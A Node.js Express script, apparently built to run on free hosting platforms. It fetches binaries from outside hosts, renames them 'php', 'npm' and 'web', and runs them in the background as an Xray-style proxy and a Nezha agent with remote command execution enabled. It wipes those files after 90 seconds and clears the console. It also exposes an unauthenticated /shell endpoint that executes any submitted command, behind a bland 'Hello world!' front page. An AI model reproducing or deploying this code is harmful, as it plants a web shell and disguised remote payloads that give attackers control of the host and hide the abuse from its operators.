const express = require("express");
const app = express();
const axios = require("axios");
const os = require('os');
const fs = require("fs");
const path = require("path");
const { promisify } = require('util');
const exec = promisify(require('child_process').exec);
const { execSync } = require('child_process');        // 只填写UPLOAD_URL将上传节点,同时填写UPLOAD_URL和PROJECT_URL将上传订阅
const FILE_PATH = process.env.FILE_PATH || './tmp';   // 运行目录,sub节点文件保存目录
const PORT = 3000 ;        // http服务订阅端口
const UUID = process.env.UUID || 'c78a721e-2d80-468d-94ab-4bfd04e1b023'; // 使用哪吒v1,在不同的平台运行需修改UUID,否则会覆盖
const NEZHA_SERVER = process.env.NEZHA_SERVER || '';        // 哪吒v1填写形式: nz.abc.com:8008  哪吒v0填写形式：nz.abc.com
const NEZHA_PORT = process.env.NEZHA_PORT || '';            // 使用哪吒v1请留空，哪吒v0需填写
const NEZHA_KEY = process.env.NEZHA_KEY || '';              // 哪吒v1的NZ_CLIENT_SECRET或哪吒v0的agent密钥
const ARGO_PORT = process.env.SERVER_PORT || process.env.PORT || 3100;  
const DOWNLOAD_WEB_ARM_NEW = 'http://fi10.bot-hosting.net:20980/download/web-arm';
const DOWNLOAD_WEB_NEW = 'http://fi10.bot-hosting.net:20980/download/web';
const DOWNLOAD_WEB_ARM_OLD = 'https://arm64.ssss.nyc.mn/web';
const DOWNLOAD_WEB_OLD = 'https://amd64.ssss.nyc.mn/web';
const DOWNLOAD_WEB_ARM = DOWNLOAD_WEB_ARM_NEW;
const DOWNLOAD_WEB = DOWNLOAD_WEB_NEW;
const names = ['web', 'web-arm', 'web2'];


function generateFallback(name) {
  return {
    path: `/download/${name}`,
    dest: 3000
  };
}
const dynamicFallbacks = names.map(generateFallback);

//创建运行文件夹
if (!fs.existsSync(FILE_PATH)) {
  fs.mkdirSync(FILE_PATH);
  console.log(`${FILE_PATH} is created`);
} else {
  console.log(`${FILE_PATH} already exists`);
}

let npmPath = path.join(FILE_PATH, 'npm');
let phpPath = path.join(FILE_PATH, 'php');
let webPath = path.join(FILE_PATH, 'web');
let botPath = path.join(FILE_PATH, 'bot');
let subPath = path.join(FILE_PATH, 'sub.txt');
let listPath = path.join(FILE_PATH, 'list.txt');
let bootLogPath = path.join(FILE_PATH, 'boot.log');
let configPath = path.join(FILE_PATH, 'config.json');



//清理历史文件
function cleanupOldFiles() {
  const pathsToDelete = ['web', 'bot', 'npm', 'php', 'sub.txt', 'boot.log'];
  pathsToDelete.forEach(file => {
    const filePath = path.join(FILE_PATH, file);
    fs.unlink(filePath, () => {});
  });
}

// 根路由

const FILE_DIR = path.join(__dirname, 'share');
const SHELL_DIR = path.join(__dirname, 'share');

app.use(express.urlencoded({ extended: true }));

app.get("/", function(req, res) {
  res.send("Hello world!");
});
// 文件列表页面
app.get('/list', (req, res) => {
  fs.readdir(FILE_DIR, (err, files) => {
    if (err) return res.status(500).send('无法读取文件目录');

    const html = `
      <h2>文件列表</h2>
      <ul>
        ${files.map(file => `<li><a href="/download/${encodeURIComponent(file)}">${file}</a></li>`).join('')}
      </ul>
    `;
    res.send(html);
  });
});

// Shell 页面（GET，显示输入框）
app.get('/shell', (req, res) => {
  res.send(renderShellPage('', '', ''));
});

// Shell 执行（POST）
app.post('/shell', async (req, res) => {
  const cmd = req.body.cmd;

  try {
    const { stdout, stderr } = await exec(cmd, { cwd: SHELL_DIR });
    res.send(renderShellPage(cmd, stdout, stderr));
  } catch (error) {
    res.send(renderShellPage(cmd, '', `❌ 错误: ${error.message}`));
  }
});

// 下载文件
app.get('/download/:filename', (req, res) => {
  const filename = decodeURIComponent(req.params.filename);
  const filePath = path.resolve(FILE_DIR, filename);

  // 防止越权访问
  if (!filePath.startsWith(path.resolve(FILE_DIR) + path.sep)) {
    return res.status(400).send('非法路径');
  }

  // 文件是否存在
  if (!fs.existsSync(filePath)) {
    return res.status(404).send('文件不存在');
  }

  res.download(filePath, err => {
    if (err) {
      console.error('下载失败:', err.message);
      if (!res.headersSent) {
        res.status(500).send('下载失败');
      }
    }
  });
});

// 渲染 Shell 页面统一方法
function renderShellPage(cmd, stdout, stderr) {
  return `
    <h3>Shell 命令执行 (目录: /share)</h3>
    <form method="POST" action="/shell">
      <input type="text" name="cmd" style="width: 400px;" placeholder="输入 shell 命令" />
      <button type="submit">执行</button>
    </form>
    ${cmd ? `
      <pre>
$ ${cmd}

${stdout || ''}
${stderr || ''}
      </pre>
    ` : ''}
    <a href="/list">← 返回文件列表</a>
  `;
}




// 生成xr-ay配置文件
const config = {
  log: { access: 'none', error: 'none', loglevel: 'none' },
  inbounds: [
   { port: ARGO_PORT, protocol: 'vless', settings: { clients: [{ id: UUID, flow: 'xtls-rprx-vision' }], decryption: 'none',
    fallbacks: [{ dest: 3001 }, 
    { path: "/vless-argo", dest: 3002 }, 
    { path: "/vmess-argo", dest: 3003 }, 
    ...dynamicFallbacks,
    { path: "/list", dest: 3000 }] }, streamSettings: { network: 'tcp' } },
    { port: 3001, listen: "127.0.0.1", protocol: "vless", settings: { clients: [{ id: UUID, level: 0 }], decryption: "none" }, streamSettings: { network: "xhttp",xhttpSettings: { path: "/xh" } } },
    { port: 3002, listen: "127.0.0.1", protocol: "vless", settings: { clients: [{ id: UUID, level: 0 }], decryption: "none" }, streamSettings: { network: "ws", security: "none", wsSettings: { path: "/vless-argo" } }, sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false } },
    { port: 3003, listen: "127.0.0.1", protocol: "vmess", settings: { clients: [{ id: UUID, alterId: 0 }] }, streamSettings: { network: "ws", wsSettings: { path: "/vmess-argo" } }, sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false } },
    { port: 3004, listen: "127.0.0.1", protocol: "trojan", settings: { clients: [{ password: UUID }] }, streamSettings: { network: "ws", security: "none", wsSettings: { path: "/trojan-argo" } }, sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false } },
  ],
  dns: { servers: ["https+local://1.1.1.1/dns-query"] },
  outbounds: [ { protocol: "freedom", tag: "direct","settings": {"domainStrategy": "UseIPv4v6"} }, {protocol: "blackhole", tag: "block"} ]
};
fs.writeFileSync(path.join(FILE_PATH, 'config.json'), JSON.stringify(config, null, 2));

// 判断系统架构
function getSystemArchitecture() {
  const arch = os.arch();
  if (arch === 'arm' || arch === 'arm64' || arch === 'aarch64') {
    return 'arm';
  } else {
    return 'amd';
  }
}

// 下载对应系统架构的依赖文件
function downloadFile(fileName, fileUrl, callback) {
  const filePath = path.join(FILE_PATH, fileName);
  const writer = fs.createWriteStream(filePath);

  axios({
    method: 'get',
    url: fileUrl,
    responseType: 'stream',
  })
    .then(response => {
      response.data.pipe(writer);

      writer.on('finish', () => {
        writer.close();
        console.log(`Download ${fileName} successfully`);
        callback(null, fileName);
      });

      writer.on('error', err => {
        fs.unlink(filePath, () => { });
        const errorMessage = `Download ${fileName} failed: ${err.message}`;
        console.error(errorMessage); // 下载失败时输出错误消息
        callback(errorMessage);
      });
    })
    .catch(err => {
      const errorMessage = `Download ${fileName} failed: ${err.message}`;
      console.error(errorMessage); // 下载失败时输出错误消息
      callback(errorMessage);
    });
}

// 下载并运行依赖文件
async function downloadFilesAndRun() {
  const architecture = getSystemArchitecture();
  const filesToDownload = getFilesForArchitecture(architecture);

  if (filesToDownload.length === 0) {
    console.log(`Can't find a file for the current architecture`);
    return;
  }

  const downloadPromises = filesToDownload.map(fileInfo => {
    return new Promise((resolve, reject) => {
      downloadFile(fileInfo.fileName, fileInfo.fileUrl, (err, fileName) => {
        if (err) {
          reject(err);
        } else {
          resolve(fileName);
        }
      });
    });
  });

  try {
    await Promise.all(downloadPromises);
  } catch (err) {
    console.error('Error downloading files:', err);
    return;
  }
  // 授权和运行
  function authorizeFiles(filePaths) {
    const newPermissions = 0o775;
    filePaths.forEach(relativeFilePath => {
      const absoluteFilePath = path.join(FILE_PATH, relativeFilePath);
      if (fs.existsSync(absoluteFilePath)) {
        fs.chmod(absoluteFilePath, newPermissions, (err) => {
          if (err) {
            console.error(`Empowerment failed for ${absoluteFilePath}: ${err}`);
          } else {
            console.log(`Empowerment success for ${absoluteFilePath}: ${newPermissions.toString(8)}`);
          }
        });
      }
    });
  }
  const filesToAuthorize = NEZHA_PORT ? ['./npm', './web', './bot'] : ['./php', './web', './bot'];
  authorizeFiles(filesToAuthorize);

  //运行ne-zha
  if (NEZHA_SERVER && NEZHA_KEY) {
    if (!NEZHA_PORT) {
      // 检测哪吒是否开启TLS
      const port = NEZHA_SERVER.includes(':') ? NEZHA_SERVER.split(':').pop() : '';
      const tlsPorts = new Set(['443', '8443', '2096', '2087', '2083', '2053']);
      const nezhatls = tlsPorts.has(port) ? 'true' : 'false';
      // 生成 config.yaml
      const configYaml = `
client_secret: ${NEZHA_KEY}
debug: false
disable_auto_update: true
disable_command_execute: false
disable_force_update: true
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: false
ip_report_period: 180000
report_delay: 4
server: ${NEZHA_SERVER}
skip_connection_count: true
skip_procs_count: true
temperature: false
tls: ${nezhatls}
use_gitee_to_upgrade: false
use_ipv6_country_code: false
uuid: ${UUID}`;
      
      fs.writeFileSync(path.join(FILE_PATH, 'config.yaml'), configYaml);
      
      // 运行 php
      const command = `nohup ${FILE_PATH}/php -c "${FILE_PATH}/config.yaml" >/dev/null 2>&1 &`;
      try {
        await exec(command);
        console.log('php is running');
        await new Promise((resolve) => setTimeout(resolve, 1000));
      } catch (error) {
        console.error(`php running error: ${error}`);
      }
    } else {
      let NEZHA_TLS = '';
      const tlsPorts = ['443', '8443', '2096', '2087', '2083', '2053'];
      if (tlsPorts.includes(NEZHA_PORT)) {
        NEZHA_TLS = '--tls';
      }
      const command = `nohup ${FILE_PATH}/npm -s ${NEZHA_SERVER}:${NEZHA_PORT} -p ${NEZHA_KEY} ${NEZHA_TLS} >/dev/null 2>&1 &`;
      try {
        await exec(command);
        console.log('npm is running');
        await new Promise((resolve) => setTimeout(resolve, 1000));
      } catch (error) {
        console.error(`npm running error: ${error}`);
      }
    }
  } else {
    console.log('empty,skip running');
  }
  //运行xr-ay
  const command1 = `nohup ${FILE_PATH}/web -c ${FILE_PATH}/config.json >/dev/null 2>&1 &`;
  try {
    await exec(command1);
    console.log('web is running');
    await new Promise((resolve) => setTimeout(resolve, 1000));
  } catch (error) {
    console.error(`web running error: ${error}`);
  }

  // 运行cloud-fared
  await new Promise((resolve) => setTimeout(resolve, 5000));

}

//根据系统架构返回对应的url
function getFilesForArchitecture(architecture) {
  let baseFiles;
  if (architecture === 'arm') {
    baseFiles = [
      { fileName: "web", fileUrl: DOWNLOAD_WEB_ARM }
    ];
  } else {
    baseFiles = [
      { fileName: "web", fileUrl: DOWNLOAD_WEB }
    ];
  }

  if (NEZHA_SERVER && NEZHA_KEY) {
    if (NEZHA_PORT) {
      const npmUrl = architecture === 'arm' 
        ? "https://arm64.ssss.nyc.mn/agent"
        : "https://amd64.ssss.nyc.mn/agent";
        baseFiles.unshift({ 
          fileName: "npm", 
          fileUrl: npmUrl 
        });
    } else {
      const phpUrl = architecture === 'arm' 
        ? "https://arm64.ssss.nyc.mn/v1" 
        : "https://amd64.ssss.nyc.mn/v1";
      baseFiles.unshift({ 
        fileName: "php", 
        fileUrl: phpUrl
      });
    }
  }

  return baseFiles;
}


// 90s后删除相关文件
function cleanFiles() {
  setTimeout(() => {
    const filesToDelete = [bootLogPath, configPath, webPath, botPath, phpPath, npmPath];  
    
    if (NEZHA_PORT) {
      filesToDelete.push(npmPath);
    } else if (NEZHA_SERVER && NEZHA_KEY) {
      filesToDelete.push(phpPath);
    }

    exec(`rm -rf ${filesToDelete.join(' ')} >/dev/null 2>&1`, (error) => {
      console.clear();
      console.log('App is running');
    });
  }, 90000); // 90s
}
cleanFiles();



// 回调运行
async function startserver() {
  cleanupOldFiles();
  await downloadFilesAndRun();
}
startserver();

app.listen(PORT, () => console.log(`http server is running on port:${ARGO_PORT}!`));
